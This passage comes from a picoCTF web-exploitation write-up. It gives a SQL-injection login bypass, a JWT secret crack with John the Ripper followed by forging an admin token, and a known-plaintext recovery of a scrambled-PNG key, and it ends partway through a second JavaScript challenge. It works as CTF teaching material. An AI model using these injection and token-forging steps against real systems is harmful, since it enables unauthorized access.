</pre><h1>Login failed.</h1>  
~~~

The OR statement is substituted by BE, we can enter a new password field using BE in place of OR:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' BE 1=1--test&debug=1"                                    
<pre>password: ' BE 1=1--test
SQL query: SELECT * FROM admin where password = '' OR 1=1--grfg'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>
~~~

We get the flag picoCTF{3v3n_m0r3_SQL_06a9db19}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{3v3n_m0r3_SQL_06a9db19}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## JaWT Scratchpad

- Author: John Hammond
- 400 points

### Description

Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/61864/ or http://jupiter.challenges.picoctf.org:61864.

### Hints

1. What is that cookie?
2. Have you heard of JWT?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the challenge website and view the source code:

~~~html
<!DOCTYPE html>
<html>
  <title>JaWT - an online scratchpad</title
  ><link rel="stylesheet" href="/static/css/stylesheet.css" />
  <body>
    <header>
      <h1>JaWT</h1>
      <br /><i
        ><small>powered by<a href="https://jwt.io/">JWT</a></small></i
      >
    </header>
    <div id="main">
      <article>
        <h1>Welcome to JaWT!</h1>
        <p>
          JaWT is an online scratchpad, where you can "jot" down whatever you'd
          like! Consider it a notebook for your thoughts.<b style="color:#00f"
            >JaWT works best in Google Chrome for some reason.</b
          >
        </p>
        <p>
          You will need to log in to access the JaWT scratchpad. You can use any
          name, other than<code>admin</code>... because
          the<code>admin</code>user gets a special scratchpad!
        </p>
        <br />
        <form action="#" method="POST">
          <input type="text" name="user" id="name" />
        </form>
        <br />
        <h2>Register with your name!</h2>
        <p>
          You can use your name as a log in, because that's quick and easy to
          remember! If you don't like your name, use a short and cool one like<a
            href="https://github.com/magnumripper/JohnTheRipper"
            >John</a
          >!
        </p>
      </article>
      <nav></nav>
      <aside></aside>
    </div>
    <script>
      window.onload=function(){document.getElementById("name").focus()}
    </script>
  </body>
</html>
~~~

We can see from the above, the webpage uses [JSON Web Tokens](https://jwt.io/) to authenticate logins to the website.

Further, the account user "admin" is described to have a special scratchpad.  We can assume this is where the flag will be hidden.

If we try to log in using the admin account, we get the message "YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.":

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=admin" -H "Content-Type: application/x-www-form-urlencoded"
<!doctype html>
<html>
  <body>
    <div id="main">
      <article>
        <p style="color:red">
          YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.
        </p>
      </article>
    </div>
  </body> 
</html>                                                                             
~~~

Logging in with a "test" user, we get a redirect:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=test" -H "Content-Type: application/x-www-form-urlencoded"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.       
~~~

We can look at a verbose response using the -v flag:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=test" -H "Content-Type: application/x-www-form-urlencoded" -v
*   Trying 3.131.60.8:443...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-CHACHA20-POLY1305
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=jupiter.challenges.picoctf.org
*  start date: Feb 23 18:02:51 2021 GMT
*  expire date: May 24 18:02:51 2021 GMT
*  subjectAltName: host "jupiter.challenges.picoctf.org" matched cert's "jupiter.challenges.picoctf.org"
*  issuer: C=US; O=Let's Encrypt; CN=R3
*  SSL certificate verify ok.
> POST /problem/61864/ HTTP/1.1
> Host: jupiter.challenges.picoctf.org
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 9
> 
* upload completely sent off: 9 out of 9 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 FOUND
< Server: nginx
< Date: Mon, 15 Mar 2021 12:52:59 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 209
< Connection: keep-alive
< Location: https://jupiter.challenges.picoctf.org/
< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA; Path=/
< Strict-Transport-Security: max-age=0
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Connection #0 to host jupiter.challenges.picoctf.org left intact
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.  
~~~

We can see a cookie is set in the response:

~~~shell
Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA; Path=/
~~~

This is the JSON Web Token access token generated at login.  We can use the [PyJWT](https://pyjwt.readthedocs.io/en/stable/) library to decode the access token without verifying of the signature:

~~~py
import jwt

encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA"

decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})

print(decoded_jwt)
~~~

This provides the response:

~~~shell
In [1]: runfile('JaWT_scratchpad.py')
{'user': 'test'}
~~~

We need to generate an authenticated JWT for {"user"; "admin"}.  We can decode the base64 JWT token in Python:

~~~py
import base64 as b64

base64_jwt = encoded_jwt.split(".")
bytes_jwt_1 = b64.b64decode(base64_jwt[0])
bytes_jwt_2 = b64.b64decode(base64_jwt[1])
hex_jwt_1 = bytes_jwt_1.hex()
hex_jwt_2 = bytes_jwt_2.hex()
bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
hex_jwt_3 = bytes_jwt_3.hex()


print(bytes_jwt_1.decode())
print(bytes_jwt_2.decode())
~~~

This provides a printable ascii string for the first two parts of the JWT:

~~~shell
In [1]: runfile('JaWT_scratchpad.py')
{"typ":"JWT","alg":"HS256"}
{"user":"test"}
~~~

This shows the token is JWT and uses hashing algorithm HS256 to generate the signature.  We can generate an ascii string formatted for John the Ripper in python:

~~~py
data = base64_jwt[0] + "." + base64_jwt[1]
signature = "#"+hex_jwt_3

string_for_john = data+signature

print(string_for_john)
~~~

We can crack the hashing secret using [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper):

~~~shell
$ john JaWT_scratchpad.john --wordlist=~/dicts/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:04 DONE (2021-03-15 13:46) 0.2028g/s 1500Kp/s 1500Kc/s 1500KC/s ilovetitor..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

The hashing secret is "ilovepico".  We can now generate a new JWT using the username admin:

~~~py
new_jwt = jwt.encode({"user": "admin"}, "ilovepico", algorithm="HS256")
print(new_jwt)
~~~

This gives us the cookie value: 

~~~
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
~~~

We can edit the cookie in Firefox and we get the string picoCTF{jawt_was_just_what_you_thought_1ca14548}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{jawt_was_just_what_you_thought_1ca14548}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Java Script Kiddie

- Author: John Johnson
- 400 points

### Description

The image link appears broken... https://jupiter.challenges.picoctf.org/problem/17205 or http://jupiter.challenges.picoctf.org:17205

### Hints

1. This is only a JavaScript problem.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and look at the source code:

~~~html
<html>
	<head>    
		<script src="jquery-3.3.1.min.js"></script>
		<script>
			var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
		</script>
	</head>
	<body>

		<center>
			<form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)">
				<input type="text" id="user_in">
				<input type="submit" value="Submit">
			</form>
			<img id="Area" src=""/>
		</center>

	</body>
</html>
~~~

We can see a html form input and a javascript function, "assemble_png":

~~~js
var bytes = [];
$.get("bytes", function(resp) {
  bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in) {
  var LEN = 16;
  var key = "0000000000000000";
  var shifter;
  if (u_in.length == LEN) {
    key = u_in;
  }
  var result = [];
  for (var i = 0; i < LEN; i++) {
    shifter = key.charCodeAt(i) - 48;
    for (var j = 0; j < (bytes.length / LEN); j++) {
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
  while (result[result.length - 1] == 0) {
    result = result.slice(0, result.length - 1);
  }
  document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
  return false;
}
~~~

The html form passes the sttring "user_in" to tthe javascript method "assemble_png".  The "user_in" string is used to generate a key.  In the javascript, we can see the user_in string must be exactly 16 characters long to generate a key:

~~~js
  var LEN = 16;
  var key = "0000000000000000";
  var shifter;
  if (u_in.length == LEN) {
    key = u_in;
  }
~~~

This key is later used to scramble the image bytes.  A for loop iterates over the length of the key (16 characters) and reads the key character as a "shifter".  In effect, the image is split into chunks of 16 Bytes and the image is scrambled by iterating through the array indexes:

~~~js
  for (var i = 0; i < LEN; i++) {
    shifter = key.charCodeAt(i) - 48;
    for (var j = 0; j < (bytes.length / LEN); j++) {
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
~~~

By using the default key, the source image is not scrambled.  We can see the image is encoded in base64 and if run with the default key, we can copy the base64 string holding the local image data.

Base64 data:

~~~
V4JOvABUGp2P7/lS+NTvUsNQAc8NBgEAd/NJwU4khWxVAAAOALpEAADeAPMAGK6jfgCF/ImxeQoAAADtST8AZGAUA+A7qxByAAAARQBERJOJs25wSnnuQQEAnACbAF94AOniKE7C+CxUANANKUiKO6RiRwDRAGOwYXjKAIfANmVA/FFHzQrzhR4Wfe0DXVoqSd0ZcvMAdBYEAztLvHep3aG4sgJJSectDmNmmaayzjZ/VPC/3AqjUUDOgIRmxUh/7/1OXQgW78+Sb4/vG/McAK2fxDD3HFRiPzSr1tYa6f5Bam87Sf+Ub2dbFM7eRvzHoXz1vGZRn3euM77zN/Oc+Xx9Ao+/G3eLflgS96vjSEI2+wBQq5JxrQRP09jWendz4S0YNixMK/0F62j4YAjlyEtA6dkXVyj+u2u1yLXptVHnq6VS/sTvMytyqkn5MnLJikALy5vA+eIjvJzfKNlDS2QtXWapDSLFUK/SgInJpy2MUqs41BF+cYvlf9+1DwB03brb5jjpHw/5SneYLCniPCP9rGEgiemlI7VoUNk4us3UD0BR5uaZPvv7L5eNbCAZQQv9d8mT8wsf9+k2ftmIjb/iidWD72SRl5Z3fJ/Lvj8SqtKvet/fcnw7XfWxZA85P++lkA2VIMYnNDVxYVu6TFtKz4XQAPXx9Ul6wd+fUq/xn+fNGFxLC/dNN6oHX3+PYM/yjpni8l2jbrkavASyZp9hNTq6rO8GTtdBnFqWcM1JTJWjn/ItkxDSMf5SfsgePr7mAlartcW5hKqZUr+a65M3OVz8MM92v6r9NX9ej3rm/pqXujeghH45t9mBtV//I98yRk1rZMsRPaMR45O2uE9+7xxzn/5vWvoOzrmJu43n0/H5J2ODX9Iyk/Fff2fvcaXfpPUj54Sm3PHPQ7KUHZxewkrebgDza56t1tL5VEJrKADLiqQA8Qltk89VHcw=
~~~

Decoded as hex:

~~~
57824EBC00541A9D8FEFF952F8D4EF52C35001CF0D06010077F349C14E24856C5500000E00BA440000DE00F30018AEA37E0085FC89B1790A000000ED493F0064601403E03BAB1072000000450044449389B36E704A79EE4101009C009B005F7800E9E2284EC2F82C5400D00D29488A3BA4624700D10063B06178CA0087C0366540FC5147CD0AF3851E167DED035D5A2A49DD1972F300741604033B4BBC77A9DDA1B8B2024949E72D0E636699A6B2CE367F54F0BFDC0AA35140CE808466C5487FEFFD4E5D0816EFCF926F8FEF1BF31C00AD9FC430F71C54623F34ABD6D61AE9FE416A6F3B49FF946F675B14CEDE46FCC7A17CF5BC66519F77AE33BEF337F39CF97C7D028FBF1B778B7E5812F7ABE3484236FB0050AB9271AD044FD3D8D67A7773E12D18362C4C2BFD05EB68F86008E5C84B40E9D9175728FEBB6BB5C8B5E9B551E7ABA552FEC4EF332B72AA49F93272C98A400BCB9BC0F9E223BC9CDF28D9434B642D5D66A90D22C550AFD28089C9A72D8C52AB38D4117E718BE57FDFB50F0074DDBADBE638E91F0FF94A77982C29E23C23FDAC612089E9A523B56850D938BACDD40F4051E6E6993EFBFB2F978D6C2019410BFD77C993F30B1FF7E9367ED9888DBFE289D583EF64919796777C9FCBBE3F12AAD2AF7ADFDF727C3B5DF5B1640F393FEFA5900D9520C627343571615BBA4C5B4ACF85D000F5F1F5497AC1DF9F52AFF19FE7CD185C4B0BF74D37AA075F7F8F60CFF28E99E2F25DA36EB91ABC04B2669F61353ABAACEF064ED7419C5A9670CD494C95A39FF22D9310D231FE527EC81E3EBEE60256ABB5C5B984AA9952BF9AEB9337395CFC30CF76BFAAFD357F5E8F7AE6FE9A97BA37A0847E39B7D981B55FFF23DF32464D6B64CB113DA311E393B6B84F7EEF1C739FFE6F5AFA0ECEB989BB8DE7D3F1F92763835FD23293F15F7F67EF71A5DFA4F523E784A6DCF1CF43B2941D9C5EC24ADE6E00F36B9EADD6D2F954426B2800CB8AA400F1096D93CF551DCC
~~~

This can be imported into python and made into an integer array:

~~~py
import numpy as np

scrambled = "57824EBC00541A9D8FEFF952F8D4EF52C35001CF0D06010077F349C14E24856C5500000E00BA440000DE00F30018AEA37E0085FC89B1790A000000ED493F0064601403E03BAB1072000000450044449389B36E704A79EE4101009C009B005F7800E9E2284EC2F82C5400D00D29488A3BA4624700D10063B06178CA0087C0366540FC5147CD0AF3851E167DED035D5A2A49DD1972F300741604033B4BBC77A9DDA1B8B2024949E72D0E636699A6B2CE367F54F0BFDC0AA35140CE808466C5487FEFFD4E5D0816EFCF926F8FEF1BF31C00AD9FC430F71C54623F34ABD6D61AE9FE416A6F3B49FF946F675B14CEDE46FCC7A17CF5BC66519F77AE33BEF337F39CF97C7D028FBF1B778B7E5812F7ABE3484236FB0050AB9271AD044FD3D8D67A7773E12D18362C4C2BFD05EB68F86008E5C84B40E9D9175728FEBB6BB5C8B5E9B551E7ABA552FEC4EF332B72AA49F93272C98A400BCB9BC0F9E223BC9CDF28D9434B642D5D66A90D22C550AFD28089C9A72D8C52AB38D4117E718BE57FDFB50F0074DDBADBE638E91F0FF94A77982C29E23C23FDAC612089E9A523B56850D938BACDD40F4051E6E6993EFBFB2F978D6C2019410BFD77C993F30B1FF7E9367ED9888DBFE289D583EF64919796777C9FCBBE3F12AAD2AF7ADFDF727C3B5DF5B1640F393FEFA5900D9520C627343571615BBA4C5B4ACF85D000F5F1F5497AC1DF9F52AFF19FE7CD185C4B0BF74D37AA075F7F8F60CFF28E99E2F25DA36EB91ABC04B2669F61353ABAACEF064ED7419C5A9670CD494C95A39FF22D9310D231FE527EC81E3EBEE60256ABB5C5B984AA9952BF9AEB9337395CFC30CF76BFAAFD357F5E8F7AE6FE9A97BA37A0847E39B7D981B55FFF23DF32464D6B64CB113DA311E393B6B84F7EEF1C739FFE6F5AFA0ECEB989BB8DE7D3F1F92763835FD23293F15F7F67EF71A5DFA4F523E784A6DCF1CF43B2941D9C5EC24ADE6E00F36B9EADD6D2F954426B2800CB8AA400F1096D93CF551DCC"

int_arr = [0]*int(len(scrambled)/2)

for i in range(0,len(scrambled),2):
    hexstr = scrambled[i]+scrambled[i+1]
    int_arr[int(np.ceil(i/2))] = int(hexstr,16)
~~~

We can see from the javascript, the image is a PNG file.  From the [PNG Specification](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) we can identify the first 16 Bytes.

The first 8 Bytes are always 137 80 78 71 13 10 26 10.  This defines the file as a png.  The next 8 Bytes make the IHDR chunk: 0 0 13 73 72 68 82.  We can add a function in Python to return the indices of these numbers from the scrambled image byte array:

~~~py
def find_in_arr(num,arr):
    return [i for i, x in enumerate(arr) if x == num]
~~~

We can define the png header and identify the locations of these Bytes in Python:

~~~py
png_arr = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

for num in png_arr:
    print("Byte {} found in scrambled array at {}".format(num,find_in_arr(num,int_arr)))
~~~

This returns:

~~~shell
In [1]: runfile('java_kiddie_1.py')
Byte 137 found in scrambled array at [52, 80, 364, 405, 450, 653]
Byte 80 found in scrambled array at [17, 275, 360, 411]
Byte 78 found in scrambled array at [2, 28, 100, 194, 552]
Byte 71 found in scrambled array at [114, 131]
Byte 13 found in scrambled array at [20, 107, 357, 484]
Byte 10 found in scrambled array at [55, 133, 181]
Byte 26 found in scrambled array at [6, 221, 539]
Byte 10 found in scrambled array at [55, 133, 181]
Byte 0 found in scrambled array at [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710]
Byte 0 found in scrambled array at [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710]
Byte 13 found in scrambled array at [20, 107, 357, 484]
Byte 73 found in scrambled array at [26, 60, 144, 164, 165, 228, 331, 505, 560]
Byte 72 found in scrambled array at [109, 190, 270]
Byte 68 found in scrambled array at [38, 77, 78]
Byte 82 found in scrambled array at [11, 15, 323, 369, 510, 572, 588]
~~~

We have now found all occurances of the PNG 16 Byte header in the scrambled file:

| PNG Byte Index | Value | Count in file | Locations |
|----------------|-------|---------------|-----------|
| 0  | 137 | 6  | [52, 80, 364, 405, 450, 653] |
| 1  | 80  | 5  | [17, 275, 360, 411] |
| 2  | 78  | 5  | [2, 28, 100, 194, 552] |
| 3  | 71  | 2  | [114, 131] |
| 4  | 13  | 4  | [20, 107, 357, 484] |
| 5  | 10  | 3  | [55, 133, 181] |
| 6  | 26  | 3  | [6, 221, 539] |
| 7  | 10  | 3  | [55, 133, 181] |
| 8  | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 9  | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 10 | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 11 | 13  | 4  | [20, 107, 357, 484] |
| 12 | 73  | 9  | [26, 60, 144, 164, 165, 228, 331, 505, 560] |
| 13 | 72  | 3  | [109, 190, 270] |
| 14 | 68  | 3  | [38, 77, 78] |
| 15 | 82  | 7  | [11, 15, 323, 369, 510, 572, 588] |

This provides us with details of all possible locations of the first 16 Bytes from which we can generate possible keys by inverting the javascript method.  Due to the number of Bytes and replication, we may need to reduce the options, the above reduces the total number of possible keys from 5E30 to 13E11.  We still have a significantly high number of possibilities.

Let's look at the first Byte:

The position in the output array will be 0 therefore:

~~~js
result[(j * LEN) + i] = result[0]
~~~

We can infer that i=j=0.  Indeed for the first 16 Bytes, we can see that j=0.

The source Byte is:

~~~js
bytes[(((j + shifter) * LEN) % bytes.length) + i] = bytes[(shifter * 16) % 771] = bytes[x]
~~~

We can determine from the javascript that 0<=shifter<= 79.  We can generate an array of solutions in python:

~~~py
for i in range(0,80,1):
    mod_array[i] = (i*16)%771
~~~

Using the index list function, we can identify which of the locations in the table above will meet the solution. For example, to check the index 52 to see if this could be the solution, we use:

~~~py
mod_array.index(52)
~~~

This can be formalised in a python script:

~~~py
png_arr = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

mod_array = [0]*80

for i in range(-48,80,1):
    mod_array[i] = (i*16)%771
    
for i in range(0,len(png_arr),1):
    print("PNG Index {}, value {}.".format(i,png_arr[i]))
    mod_array = [0]*80
    for j in range(0,80,1):
        mod_array[j] = ((j*16)%771)+i
    solutions = find_in_arr(png_arr[i],int_arr)
    sol2 = []
    for sol in solutions:
        try:
            mod_array.index(sol)
            sol2.append(sol)
        except:
            pass
    print("{} Location found".format(len(sol2)))
    print("Locations = {}".format(sol2))
~~~

This returns:

~~~shell
PNG Index 0, value 137.
1 Location found
Locations = [80]
PNG Index 1, value 80.
1 Location found
Locations = [17]
PNG Index 2, value 78.
2 Location found
Locations = [2, 194]
PNG Index 3, value 71.
1 Location found
Locations = [131]
PNG Index 4, value 13.
2 Location found
Locations = [20, 484]
PNG Index 5, value 10.
2 Location found
Locations = [133, 181]
PNG Index 6, value 26.
1 Location found
Locations = [6]
PNG Index 7, value 10.
1 Location found
Locations = [55]
PNG Index 8, value 0.
6 Location found
Locations = [40, 56, 72, 117, 149, 501]
PNG Index 9, value 0.
4 Location found
Locations = [57, 73, 89, 105]
PNG Index 10, value 0.
5 Location found
Locations = [23, 39, 42, 58, 74]
PNG Index 11, value 13.
1 Location found
Locations = [107]
PNG Index 12, value 73.
2 Location found
Locations = [60, 505]
PNG Index 13, value 72.
1 Location found
Locations = [109]
PNG Index 14, value 68.
1 Location found
Locations = [78]
PNG Index 15, value 82.
1 Location found
Locations = [15]
~~~

We can update the table:

| PNG Byte Index | Value | Solvable locations in file | Locations | Shifter |
|----------------|-------|---------------|-----------|---|
| 0  | 137 | 1  | [80] | 5 |
| 1  | 80  | 1  | [17] | 1 |
| 2  | 78  | 2  | [2, 194] | 0, 12 |
| 3  | 71  | 1  | [131] | 8 |
| 4  | 13  | 2  | [20, 484] | 1, 30 |
| 5  | 10  | 2  | [133, 181] | 8, 11 |
| 6  | 26  | 1  | [6] | 0 |
| 7  | 10  | 1  | [55] | 3 |
| 8  | 0   | 6  | [40, 56, 72, 117, 149, 501] | 2,3,4,55,57,79 |
| 9  | 0   | 4  | [57, 73, 89, 105] | 3,4,5,6 |
| 10 | 0   | 5  | [23, 39, 42, 58, 74] | 49, 50, 2, 3, 4 |
| 11 | 13  | 1  | [107] | 6 |
| 12 | 73  | 2  | [60, 505] | 3, 79 |
| 13 | 72  | 1  | [109] | 6 |
| 14 | 68  | 1  | [78] | 4 |
| 15 | 82  | 1  | [15] | 0 |

We have reduced the number of possible keys to 1920.

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48, 60                    | "0", "<"                       |
| 3         | 56                        | "8"                            |
| 4         | 49, 78                    | "1", "N"                       |
| 5         | 56, 59                    | "8", ":"                       |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52, 103, 105, 127 | "2", "3", "4", "g", "i", [DEL] |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52, 97, 98        | "2", "3", "4", "a", "b"        |
| 11        | 54                        | "6"                            |
| 12        | 51, 127                   | "3", [DEL]                     |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

We can reduce the number of feasoble passwords by removing characters that cannot be parsed by the web form:

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48, 60                    | "0", "<"                       |
| 3         | 56                        | "8"                            |
| 4         | 49, 78                    | "1", "N"                       |
| 5         | 56, 59                    | "8", ":"                       |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52, 103, 105      | "2", "3", "4", "g", "i"        |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52, 97, 98        | "2", "3", "4", "a", "b"        |
| 11        | 54                        | "6"                            |
| 12        | 51                        | "3",                           |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

This reduces the number of feasible passwords to 800.  We can further simplify if we assume the password is constructed of integers only:

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48                        | "0"                            |
| 3         | 56                        | "8"                            |
| 4         | 49                        | "1"                            |
| 5         | 56                        | "8"                            |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52                | "2", "3", "4"                  |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52                | "2", "3", "4"                  |
| 11        | 54                        | "6"                            |
| 12        | 51                        | "3",                           |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

This reduces it to 36 possible passwords.

Iterating through these passwords, we find the correct passphrase is: 5108180345363640

This descrambles the png and gives us a QR code.  Using QR scanner, we are able to retrieve the flag: picoCTF{066cad9e69c5c7e5d2784185c0feb30b}

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{066cad9e69c5c7e5d2784185c0feb30b}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Java Script Kiddie 2

- Author: John Johnson
- 450 points

### Description

The image link appears broken... twice as badly... https://jupiter.challenges.picoctf.org/problem/51400 or http://jupiter.challenges.picoctf.org:51400

### Hints

1. This is only a JavaScript problem.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can view the wesbsite source code using curl:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/51400/"
~~~

We get the following html:

~~~html
<html>
<head>
	<script src="jquery-3.3.1.min.js"></script>
	<script>
        	var bytes = [];
		$.get("bytes", function(resp) {
                	bytes = Array.from(resp.split(" "), x => Number(x));
              	});

                function assemble_png(u_in){
			var LEN = 16;
			var key = "00000000000000000000000000000000";
			var shifter;
			if(u_in.length == key.length){
				key = u_in;
			}
			var result = [];
			for(var i = 0; i < LEN; i++){
				shifter = Number(key.slice((i*2),(i*2)+1));
				for(var j = 0; j < (bytes.length / LEN); j ++){
					result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
				}
			}
			while(result[result.length-1] == 0){
				result = result.slice(0,result.length-1);
			}
			document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
			return false;
		}
	</script>
</head>
<body>
	<center>
	<form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)">
	<input type="text" id="user_in">
	<input type="submit" value="Submit">
	</form>
	<img id="Area" src=""/>
	</center>
</body>
</html>
~~~

We can inspect the JavaScript in more detail:

~~~js
var bytes = [];
$.get("bytes", function(resp) {
  bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in) {
  var LEN = 16;
  var key = "00000000000000000000000000000000";
  var shifter;
  if (u_in.length == key.length) {
    key = u_in;
  }
  var result = [];
  for (var i = 0; i < LEN; i++) {
    shifter = Number(key.slice((i * 2), (i * 2) + 1));
    for (var j = 0; j < (bytes.length / LEN); j++) {
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
  while (result[result.length - 1] == 0) {
    result = result.slice(0, result.length - 1);
  }
